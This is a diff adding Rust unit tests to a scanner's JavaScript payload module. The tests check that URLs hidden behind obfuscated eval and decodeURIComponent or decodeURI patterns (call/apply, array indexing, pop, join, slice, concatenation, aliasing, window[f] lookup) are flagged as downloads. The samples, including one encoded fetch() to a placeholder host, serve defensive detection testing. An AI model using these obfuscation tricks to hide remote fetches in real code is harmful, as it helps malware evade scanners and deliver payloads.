@@ -38828,6 +38828,288 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_decodeuricomponent_call_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js =
+            br#"eval(decodeURIComponent.call(null, "https%3A%2F%2Fdecode-call-js.example%2Fp"))"#
+                .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://decode-call-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS decodeURIComponent.call URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_decodeuricomponent_apply_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js =
+            br#"eval(decodeURIComponent.apply(null, ["https%3A%2F%2Fdecode-apply-js.example%2Fp"]))"#
+                .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://decode-apply-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS decodeURIComponent.apply URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_decodeuricomponent_apply_array_variable_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"var a = ["https%3A%2F%2Fdecode-apply-array-var-js.example%2Fp"]; eval(decodeURIComponent.apply(null, a))"#
+            .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://decode-apply-array-var-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS decodeURIComponent.apply array variable URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_decodeuricomponent_apply_bound_array_variable_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"var e = "https%3A%2F%2Fdecode-apply-bound-array-js.example%2Fp"; var a = [e]; eval(decodeURIComponent.apply(null, a))"#
+            .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://decode-apply-bound-array-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS decodeURIComponent.apply bound array variable URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_decodeuricomponent_array_index_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"var a = ["https%3A%2F%2Fdecode-array-index-js.example%2Fp"]; eval(decodeURIComponent(a[0]))"#
+            .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://decode-array-index-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS decodeURIComponent array index URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_decodeuricomponent_assigned_array_index_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"var a = ["https%3A%2F%2Fdecode-assigned-array-index-js.example%2Fp"]; var e = a[0]; eval(decodeURIComponent(e))"#
+            .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://decode-assigned-array-index-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS decodeURIComponent assigned array index URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_decodeuricomponent_array_pop_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"var a = ["noise", "https%3A%2F%2Fdecode-array-pop-js.example%2Fp"]; eval(decodeURIComponent(a.pop()))"#
+            .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://decode-array-pop-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS decodeURIComponent array pop URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_decodeuricomponent_assigned_array_pop_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"var a = ["noise", "https%3A%2F%2Fdecode-assigned-array-pop-js.example%2Fp"]; var e = a.pop(); eval(decodeURIComponent(e))"#
+            .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://decode-assigned-array-pop-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS decodeURIComponent assigned array pop URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_decodeuricomponent_assigned_array_join_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"var a = ["https%3A", "%2F%2Fdecode-assigned-array-join-js.example", "%2Fp"]; var e = a.join(""); eval(decodeURIComponent(e))"#
+            .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://decode-assigned-array-join-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS decodeURIComponent assigned array join URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_decodeuricomponent_assigned_array_slice_join_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"var a = ["noise", "https%3A", "%2F%2Fdecode-assigned-array-slice-join-js.example", "%2Fp", "noise"]; var e = a.slice(1, 4).join(""); eval(decodeURIComponent(e))"#
+            .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://decode-assigned-array-slice-join-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS decodeURIComponent assigned array slice/join URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_decodeuricomponent_concat_arg_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"var p = "https%3A%2F%2Fdecode-concat-arg-js."; var q = "example%2Fp"; eval(decodeURIComponent(p + q))"#
+            .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://decode-concat-arg-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS decodeURIComponent concat arg URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_decodeuricomponent_function_alias_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"var d = window.decodeURIComponent; eval(d("fetch%28%27https%3A%2F%2Fdecode-alias-js.example%2Fp%27%29"))"#
+            .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://decode-alias-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS decodeURIComponent function alias URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_variable_member_decodeuricomponent_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"var f = "decode" + "URIComponent"; var e = "https%3A%2F%2Fmember-decode-js.example%2Fp"; var u = window[f](e); eval(u)"#
+            .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://member-decode-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS variable member decodeURIComponent URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_direct_variable_member_decodeuricomponent_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"var f = "decode" + "URIComponent"; eval(window[f]("https%3A%2F%2Fdirect-member-decode-js.example%2Fp"))"#
+            .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://direct-member-decode-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS direct variable member decodeURIComponent URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_decodeuri_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"eval(decodeURI("https%3A%2F%2Fdecodeuri-js.example%2Fp"))"#.to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://decodeuri-js.example/p"
+            )
+        });
+        assert!(has, "JS decodeURI URL missed: {:?}", env.traits);
+    }
+
+    #[test]
     fn js_unescape_malformed_percent_still_extracts_later_url() {
         let mut env = Environment::new(&Config::default());
         let js =
